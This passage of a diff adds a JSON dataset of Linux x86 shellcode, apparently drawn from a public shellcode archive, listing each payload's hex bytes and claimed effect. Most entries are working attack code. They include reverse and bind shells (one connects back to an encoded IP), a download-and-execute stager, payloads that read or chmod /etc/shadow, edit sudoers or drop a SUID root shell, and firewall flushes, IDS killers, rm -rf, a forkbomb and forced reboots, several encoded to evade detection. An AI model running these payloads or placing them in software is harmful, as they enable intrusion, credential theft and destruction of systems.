+    "bytes_hex": "31c031db31c9b017cd80eb365e88460a8d5e05b1edb027cd8031c0b03dcd8083c302b00ccd80e0fab03dcd8089760831c088460789460c89f38d4e0889c2b00bcd80e8c5ffffff",
+    "claimed_effect": "chroot()-execve() code",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/connect_back&send;&exit;_-etc-shadow.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 2,
+    "bytes_hex": "31db",
+    "claimed_effect": "connect back&send;&exit; -etc-shadow",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/connect_back,_download_a_file_and_execute.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 151,
+    "bytes_hex": "31c9f7e131db99506a016a0289e143b066cd8089c752688c7335236668270fb202665289e16a10515789e1b303b066cd8031db31c9516668636289e366b9420266bac001b005cd8089c631c9f7e19966bae80331db31c0b00389fb8d8c2418fcffffcd8089f389c231c0b004cd806681fae80374de89f331c0b006cd8031c9f7e1516668636289e3515389e1b00bcd8031c031db40cd80",
+    "claimed_effect": "connect back, download a file and execute",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/connect_back_shellcode_(port=0xb0ef).c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 131,
+    "bytes_hex": "31c031db31c951b10651b10151b1025189e1b301b066cd8089c231c031c9515168414243446668b0efb102665189e7b31053575289e1b303b066cd8031c939c1740631c0b001cd8031c0b03f89d3cd8031c0b03f89d3b101cd8031c0b03f89d3b102cd8031c031d250686e2f7368682f2f626989e3505389e1b00bcd8031c0b001cd80",
+    "claimed_effect": "connect back shellcode (port=0xb0ef)",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/disabled_modsecurity.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 63,
+    "bytes_hex": "31c0509968736d6f6468613264696862696e2f6873722f73682f2f2f7589e36a3268726974796873656375686d6f642d89e131d2b00b52515389e189e2cd80",
+    "claimed_effect": "disabled modsecurity",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/disables_shadowing.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 42,
+    "bytes_hex": "31db8d431799cd80b00b5268636f6e76687077756e6862696e2f6873722f73682f2f2f7589e389d1cd80",
+    "claimed_effect": "disables shadowing",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/dup2(0,0);_dup2(0,1);_dup2(0,2);_15_bytes.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 15,
+    "bytes_hex": "31c9565b6a3f58cd804180f90375f5",
+    "claimed_effect": "dup2(0,0); dup2(0,1); dup2(0,2); 15 bytes",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/edit_-etc-sudoers_for_full_access.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 86,
+    "bytes_hex": "31c050686f657273682f737564682f65746389e366b90104b005cd8089c331c05068414c4c0a6857443a2068504153536829204e4f6828414c4c68414c4c3d68414c4c2089e1b21cb004cd80b006cd8031dbb001cd80",
+    "claimed_effect": "edit -etc-sudoers for full access",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/egghunt_shellcode.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 29,
+    "bytes_hex": "eb1658408178f86567672075f68178fc6d61726b75edffe0e8e5ffffff",
+    "claimed_effect": "egghunt shellcode",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/egghunter_shellcode.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 16,
+    "bytes_hex": "6681c9ff0f416a4358cd803cf274f1b8",
+    "claimed_effect": "egghunter shellcode",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/eject_&_close_cd-rom_frenzy_loop_(follows_-dev-cdrom_symlink).c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 45,
+    "bytes_hex": "6a055831c951b5086864726f6d6865762f63682f2f2f6489e3cd8089c366b90953b036cd80f572f580c110ebf4",
+    "claimed_effect": "eject & close cd-rom frenzy loop (follows -dev-cdrom symlink)",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/eject_-dev-cdrom.c",
+    "bucket": "asm",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 0,
+    "bytes_hex": null,
+    "claimed_effect": "eject -dev-cdrom",
+    "supported": false
+  },
+  {
+    "source_file": "Linux/x86/examples_of_long-term_payloads_hide-wait-change.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 172,
+    "bytes_hex": "6a0258cd8085c0747931c040cd805b8d7310fe430f9931c9b005cd80936a0358b2fa89e129d1cd8089cf01c793fd6a20586a0e5987cbf2ae87cbe2f8474731c06a0a5bfc31d28a0f83e93001c847803f207404f7e3ebed945f5f9457b1ff31c0f3aa5f564e4641803eff75f9fe065ef3a4b042cd8089f7924889c1f2aefe47ffffe7e887ffffffffffff6a034089e189e334a2cd8031c989f33421cd8085c075ebb00f66b96d09cd8040cd80",
+    "claimed_effect": "examples of long-term payloads hide-wait-change",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/examples_of_long-term_payloads_hide-wait-change_(.s).c",
+    "bucket": "asm",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 0,
+    "bytes_hex": null,
+    "claimed_effect": "examples of long-term payloads hide-wait-change (.s)",
+    "supported": false
+  },
+  {
+    "source_file": "Linux/x86/execve()-bin-ash;_exit;.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 34,
+    "bytes_hex": "31c050682f617368682f62696e89e38d54240850538d0c24b00bcd8031c0b001cd80",
+    "claimed_effect": "execve()-bin-ash; exit;",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/execve().c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 49,
+    "bytes_hex": "eb1a5e31c08846078d1e895e0889460cb00b89f38d4e088d560ccd80e8e1ffffff2f62696e2f73684a414141414b4b4b4b",
+    "claimed_effect": "execve()",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/execve()_Diassembly_Obfuscation_Shellcode.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 32,
+    "bytes_hex": "68cd806868ebfc686a0b5831d252682f2f7368682f62696e89e3525389e1ebe1",
+    "claimed_effect": "execve() Diassembly Obfuscation Shellcode",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/execve()_of_-sbin-iptables_-F.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 70,
+    "bytes_hex": "eb215e31c088460e8846118976128d5e0f895e1689461ab00b89f38d4e128d561acd80e8daffffff2f7362696e2f69707461626c6573382d4632333435363738396162636465",
+    "claimed_effect": "execve() of -sbin-iptables -F",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/execve(-bin--sh-,[-bin--sh],NULL).c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 22,
+    "bytes_hex": "b00b9952682f2f7368682f62696e89e3525389e1cd80",
+    "claimed_effect": "execve(-bin--sh-,[-bin--sh],NULL)",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/execve(-bin-bash,_[-bin-sh,_-p],_NULL).c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 33,
+    "bytes_hex": "6a0b58995266682d7089e1526a68682f626173682f62696e89e352515389e1cd80",
+    "claimed_effect": "execve(-bin-bash, [-bin-sh, -p], NULL)",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/execve(-bin-cat,_-etc-shadow,_NULL).c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 42,
+    "bytes_hex": "31c050682f636174682f62696e89e3506861646f77682f2f7368682f65746389e150515389e1b00bcd80",
+    "claimed_effect": "execve(-bin-cat, -etc-shadow, NULL)",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/execve(-bin-dash).c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 49,
+    "bytes_hex": "eb185e31c088460989760a89460eb00b89f38d4e0a8d560ecd80e8e3ffffff2f62696e2f64617368414242424243434343",
+    "claimed_effect": "execve(-bin-dash)",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/execve(-bin-sh).c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 25,
+    "bytes_hex": "eb0b5b31c031c931d2b00bcd80e8f0ffffff2f62696e2f7368",
+    "claimed_effect": "execve(-bin-sh)",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/execve(-bin-sh,0,0).c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 21,
+    "bytes_hex": "31c9f7e151682f2f7368682f62696e89e3b00bcd80",
+    "claimed_effect": "execve(-bin-sh,0,0)",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/execve(-bin-sh,_[-bin-sh,_NULL])_+_Bitmap.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 27,
+    "bytes_hex": "424d36916a0b589952682f2f7368682f62696e89e3525389e1cd80",
+    "claimed_effect": "execve(-bin-sh, [-bin-sh, NULL]) + Bitmap",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/execve(-bin-sh,_[-bin-sh,_NULL])_+_RIFF_Header.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 28,
+    "bytes_hex": "52494646406a0b589952682f2f7368682f62696e89e3525389e1cd80",
+    "claimed_effect": "execve(-bin-sh, [-bin-sh, NULL]) + RIFF Header",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/execve(-bin-sh,_[-bin-sh,_NULL])_+_RTF_header.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 30,
+    "bytes_hex": "7b5c72746631c06a0b589952682f2f7368682f62696e89e3525389e1cd80",
+    "claimed_effect": "execve(-bin-sh, [-bin-sh, NULL]) + RTF header",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/execve(-bin-sh,_[-bin-sh,_NULL])_+_ZIP_Header.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 28,
+    "bytes_hex": "504b0304246a0b589952682f2f7368682f62696e89e3525389e1cd80",
+    "claimed_effect": "execve(-bin-sh, [-bin-sh, NULL]) + ZIP Header",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/execve(-bin-sh,_[-bin-sh],_NULL)_-_encoded_by_+1.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 39,
+    "bytes_hex": "688ae2ce8168b10c5354686a6f8ae4680169306368693074696a1459fe0c0c4979fa41f7e154c3",
+    "claimed_effect": "execve(-bin-sh, [-bin-sh], NULL) - encoded by +1",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/execve(-sbin-halt,-sbin-halt).c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 27,
+    "bytes_hex": "6a0b58995266686c74686e2f6861682f73626989e3525389e1cd80",
+    "claimed_effect": "execve(-sbin-halt,-sbin-halt)",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/execve(-sbin-reboot,-sbin-reboot).c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 28,
+    "bytes_hex": "6a0b58995268626f6f74686e2f7265682f73626989e3525389e1cd80",
+    "claimed_effect": "execve(-sbin-reboot,-sbin-reboot)",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/execve(-sbin-shutdown,-sbin-shutdown_0).c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 36,
+    "bytes_hex": "6a0b58995268646f776e687368757468696e2f2f682f2f736289e3526a30525389e1cd80",
+    "claimed_effect": "execve(-sbin-shutdown,-sbin-shutdown 0)",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/execve(rm_-rf_-).c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 45,
+    "bytes_hex": "6a0b5899526a2f89e75266682d6689e65266682d7289e152682f2f726d682f62696e89e3525756515389e1cd80",
+    "claimed_effect": "execve(rm -rf -)",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/execve-chmod_0777_-etc-shadow.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 57,
+    "bytes_hex": "31c0506861646f77682f2f7368682f65746389e650683037373789e55068686d6f6468696e2f6366682f6289e35056555389e189c2b00bcd80",
+    "claimed_effect": "execve-chmod 0777 -etc-shadow",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/execve_(-bin-sh).c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 21,
+    "bytes_hex": "31c9f7e151682f2f7368682f62696e89e3b00bcd80",
+    "claimed_effect": "execve (-bin-sh)",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/execve_-bin-sh.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 21,
+    "bytes_hex": "6a0b589952682f2f7368682f62696e89e331c9cd80",
+    "claimed_effect": "execve -bin-sh",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/execve_-bin-sh_anti-ids_40_bytes.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 40,
+    "bytes_hex": "99525852bfb797393401ff57bf9717b13401ff475789e3525389e1b0632c5881ef62ae616957ffd4",
+    "claimed_effect": "execve -bin-sh anti-ids 40 bytes",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/execve_-bin-sh_encrypted.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 58,
+    "bytes_hex": "eb1b5f31c06a536a1859495b8a040ff6d330d888040f5085c975efeb05e8e0ffffff1c7fc5f9bea3e4ffb8ffb2f41f954efe25979330b639b22c",
+    "claimed_effect": "execve -bin-sh encrypted",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/execve_-bin-sh_shellcode.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 23,
+    "bytes_hex": "31c050682f2f7368682f62696e89e3505389e1b00bcd80",
+    "claimed_effect": "execve -bin-sh shellcode",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/execve_-bin-sh_xored_for_Intel_x86_CPUID_41_bytes.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 41,
+    "bytes_hex": "31c00fa25168e795a8ec68de7f373f68071aec8f686e1c4a0e68065b1604310c245a75fa83ec1854c3",
+    "claimed_effect": "execve -bin-sh xored for Intel x86 CPUID 41 bytes",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/execve_of_-bin-sh_-tmp-p00p.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 70,
+    "bytes_hex": "eb215e31c08846078846118976128d5e08895e1689461ab00b89f38d4e128d561acd80e8daffffff2f62696e2f7368382f746d702f7030307032333435363738396162636465",
+    "claimed_effect": "execve of -bin-sh -tmp-p00p",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/execve_of_-sbin-ipchains_-F.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 70,
+    "bytes_hex": "eb215e31c088460e8846118976128d5e0f895e1689461ab00b89f38d4e128d561acd80e8daffffff2f7362696e2f6970636861696e73382d4632333435363738396162636465",
+    "claimed_effect": "execve of -sbin-ipchains -F",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/execve_read_shellcode.c",
+    "bucket": "asm",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 0,
+    "bytes_hex": null,
+    "claimed_effect": "execve read shellcode",
+    "supported": false
+  },
+  {
+    "source_file": "Linux/x86/exit(0)_3_bytes_or_exit(1)_4_bytes.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 3,
+    "bytes_hex": "40cd80",
+    "claimed_effect": "exit(0) 3 bytes or exit(1) 4 bytes",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/exit(1).c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 7,
+    "bytes_hex": "31c04089c3cd80",
+    "claimed_effect": "exit(1)",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/force_unmount_-media-disk.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 33,
+    "bytes_hex": "eb0f31c0b0345bcd8031c0b00131dbcd80e8ecffffff2f6d656469612f6469736b",
+    "claimed_effect": "force unmount -media-disk",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/fork().c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 6,
+    "bytes_hex": "b002cd80ebfa",
+    "claimed_effect": "fork()",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/forkbomb.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 7,
+    "bytes_hex": "6a0258cd80ebf9",
+    "claimed_effect": "forkbomb",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/forking_portbind_shellcode.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 200,
+    "bytes_hex": "31c031db31c951b10651b10151b1025189e1b301b066cd8089c131c031db5050506668b0efb302665389e2b31053b302525189ca89e1b066cd8031db39c3740531c040cd8031c0505289e1b304b066cd8089d731c031db31c9b311b101b030cd8031c031db50505789e1b305b066cd8089c631c031dbb002cd8039c3754031c089fbb006cd8031c031c989f3b03fcd8031c041b03fcd8031c041b03fcd8031c050682f2f7368682f62696e89e38b542408505389e1b00bcd8031c040cd8031c089f3b006cd80eb99",
+    "claimed_effect": "forking portbind shellcode",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/give_all_user_root_access_when_execute_-bin-sh.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 45,
+    "bytes_hex": "eb1f31c0b0b65b31c931d2cd8031c0b00f89db66b9ed09cd8031c0b00131dbcd80e8dcffffff2f62696e2f7368",
+    "claimed_effect": "give all user root access when execute -bin-sh",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/hard_reboot_(without_any_message)_and_data_not_lost.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 33,
+    "bytes_hex": "b024cd8031c0b058bbaddee1feb969191228ba67452301cd8031c0b00131dbcd80",
+    "claimed_effect": "hard reboot (without any message) and data not lost",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/hard_reboot_(without_any_message)_and_data_will_be_lost.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 29,
+    "bytes_hex": "31c0b058bbaddee1feb969191228ba67452301cd8031c0b00131dbcd80",
+    "claimed_effect": "hard reboot (without any message) and data will be lost",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/hence_dropping_a_SUID_root_shell_in_-tmp.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 125,
+    "bytes_hex": "29c0b002cd8085c07502eb0529c040cd8029c029db29c9b046cd80eb2a5e8976328d5e08895e368d5e0b895e3a29c088460788460a88463189463e87f3b00b8d4b328d533ecd80e8d1ffffff2f62696e2f7368202d63206370202f62696e2f7368202f746d702f73683b2063686d6f642034373535202f746d702f7368",
+    "claimed_effect": "hence dropping a SUID root shell in -tmp",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/iopl(3);_asm(cli);_while(1){}.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 12,
+    "bytes_hex": "31c06a035bb06ecd80faebfe",
+    "claimed_effect": "iopl(3); asm(cli); while(1){}",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/ip6tables_-F.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 47,
+    "bytes_hex": "6a0b58995266682d4689e1526a7366686c656836746162686e2f6970682f736269682f75737289e352515389e1cd80",
+    "claimed_effect": "ip6tables -F",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/ipchains_-F.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 40,
+    "bytes_hex": "6a0b58995266682d4689e15266686e736863686169686e2f6970682f73626989e352515389e1cd80",
+    "claimed_effect": "ipchains -F",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/iptables_--flush.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 43,
+    "bytes_hex": "31c05066682d4689e65068626c657368697074616862696e2f682f2f2f7389e350565389e189c2b00bcd80",
+    "claimed_effect": "iptables --flush",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/iptables_-F.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 58,
+    "bytes_hex": "eb215e31c088460e8846118976128d5e0f895e1689461ab00b89f38d4e128d561acd80e8daffffff2f7362696e2f69707461626c6573232d4623",
+    "claimed_effect": "iptables -F",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/jump-call-pop_execve_shell.c",
+    "bucket": "asm",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 0,
+    "bytes_hex": null,
+    "claimed_effect": "jump-call-pop execve shell",
+    "supported": false
+  },
+  {
+    "source_file": "Linux/x86/kill_all_processes.c",
+    "bucket": "asm",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 0,
+    "bytes_hex": null,
+    "claimed_effect": "kill all processes",
+    "supported": false
+  },
+  {
+    "source_file": "Linux/x86/kill_snort.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 151,
+    "bytes_hex": "eb035eeb05e8f8ffffff83c60d31c9b18080360146e2faea182e7472732e63686f2e716a686d6d012c313801726f6e73750180ed662a0101ea0c919191919191919191919191915488e4575282ed11e9010101015a80c2ca11010130d3c644f5010101018c8208eefefe8cb2fbeffefe8844ed8c820ceefefe8844f1b90a0101018874e98c4ce95288f2cc8182c5115a5f5cc291919191",
+    "claimed_effect": "kill snort",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/killall5_polymorphic_shellcode.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 61,
+    "bytes_hex": "eb115e31c9b137806c0eff0180e90175f6eb05e8eaffffff32c15167696d36696d6d626d696f306c6a693074636a8ae4518ae3548ae2b10cce8141ce81",
+    "claimed_effect": "killall5 polymorphic shellcode",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/listens_for_shellcode_on_tcp-5555_and_jumps_to_it.c",
+    "bucket": "asm",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 0,
+    "bytes_hex": null,
+    "claimed_effect": "listens for shellcode on tcp-5555 and jumps to it",
+    "supported": false
+  },
+  {
+    "source_file": "Linux/x86/mkdir()_&_exit().c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 36,
+    "bytes_hex": "eb165e31c0884606b0278d1e66b9ed01cd80b00131dbcd80e8e5ffffff6861636b656423",
+    "claimed_effect": "mkdir() & exit()",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/nc_-lp_31337_-e_-bin--sh_polymorphic.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 91,
+    "bytes_hex": "eb115e31c9b143806c0eff3580e90175f6eb05e8eaffffff9566f56607e540879da364a89d9d6464979ebe18879d62989898be1687203c8688be1602b5961d29343434a3985562a1a555686668686c55629a5564979ea36464a89d",
+    "claimed_effect": "nc -lp 31337 -e -bin--sh polymorphic",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/nc_-lvve-bin-sh_-p13377.c",
+    "bucket": "asm",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 0,
+    "bytes_hex": null,
+    "claimed_effect": "nc -lvve-bin-sh -p13377",
+    "supported": false
+  },
+  {
+    "source_file": "Linux/x86/netcat_bindshell_port_6666.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 69,
+    "bytes_hex": "31c0506874636174686e2f6e6568722f6269682f2f757389e3506836363636682d6c747089e250686e2f7368682f2f626966682d6589e15051525389e6b00b89f131d2cd80",
+    "claimed_effect": "netcat bindshell port 6666",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/netcat_bindshell_port_8080.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 75,
+    "bytes_hex": "eb2a5e31c088460788460f88461989761a8d5e08895e1e8d5e10895e22894626b00b89f38d4e1a8d5626cd80e8d1ffffff2f62696e2f6e63232d6c7038303830232d652f62696e2f736823",
+    "claimed_effect": "netcat bindshell port 8080",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/netcat_connect_back_port_8080.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 76,
+    "bytes_hex": "eb2a5e31c088460788461588461a89761b8d5e08895e1f8d5e16895e23894627b00b89f38d4e1b8d5627cd80e8d1ffffff2f62696e2f6e63233139322e3136382e312e313031233830383023",
+    "claimed_effect": "netcat connect back port 8080",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/open_cd-rom_loop_(follows_-dev-cdrom_symlink).c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 39,
+    "bytes_hex": "6a055831c951b5086864726f6d6865762f63682f2f2f6489e3cd8089c366b90953b036cd80ebfa",
+    "claimed_effect": "open cd-rom loop (follows -dev-cdrom symlink)",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/overwrite_MBR_on_-dev-sda_with_LOL!.c",
+    "bucket": "asm",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 0,
+    "bytes_hex": null,
+    "claimed_effect": "overwrite MBR on -dev-sda with LOL!",
+    "supported": false
+  },
+  {
+    "source_file": "Linux/x86/polymorphic_cdrom_ejecting.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 70,
+    "bytes_hex": "eb115e31c9b13e806c0eff3580e90175f6eb05e8eaffffff9f408dce879fa29d9899a7a4be16879b9d98a99d649a9f9a9d64979ea39d64aaa8a7be18878688be1602b57502b5",
+    "claimed_effect": "polymorphic cdrom ejecting",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/polymorphic_execve(-bin-bash,_[-bin-sh,_-p],_NULL).c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 57,
+    "bytes_hex": "eb115e31c9b121806c0eff0180e90175f6eb05e8eaffffff6b0c599a5367692e718ae2536b6969306362746930636a6f8ae45352548ae2ce81",
+    "claimed_effect": "polymorphic execve(-bin-bash, [-bin-sh, -p], NULL)",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/polymorphic_forkbombe.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 30,
+    "bytes_hex": "eb115e31c9b106806c0eff0180e90175f6eb05e8eaffffffb103ce81ecfb",
+    "claimed_effect": "polymorphic forkbombe",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/polymorphic_ip6tables_-F.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 71,
+    "bytes_hex": "eb115e31c9b147806c0eff0180e90175f6eb05e8eaffffff6b0c599a5367692e478ae2536b7467696d666937756263696f306a71693074636a69307674738ae45352548ae2ce81",
+    "claimed_effect": "polymorphic ip6tables -F",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/portbind_(define_your_own_port).c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 20,
+    "bytes_hex": "6a66586a015b9952536a0289e1cd80524368ff02",
+    "claimed_effect": "portbind (define your own port)",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/portbind_-bin-sh_(port_64713).c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 83,
+    "bytes_hex": "6a665831db5343536a0289e1cd8031d25268ff02fcc989e16a10515089e189c643b066cd80b0664343cd80505689e143b066cd80936a0359496a3f58cd8075f8f7e151682f2f7368682f62696e89e3b00bcd80",
+    "claimed_effect": "portbind -bin-sh (port 64713)",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/portbind_a_shell_in_port_5074.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 92,
+    "bytes_hex": "31c0504089c350405089e1b066cd8031d252666813d243665389e16a10515089e1b066cd8040894424044343b066cd8083c40c525243b066cd809389d1b03fcd804180f90375f652686e2f7368682f2f626989e3525389e1b00bcd80",
+    "claimed_effect": "portbind a shell in port 5074",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/portbind_port_64713.c",
+    "bucket": "hex",
+    "os": "Linux",
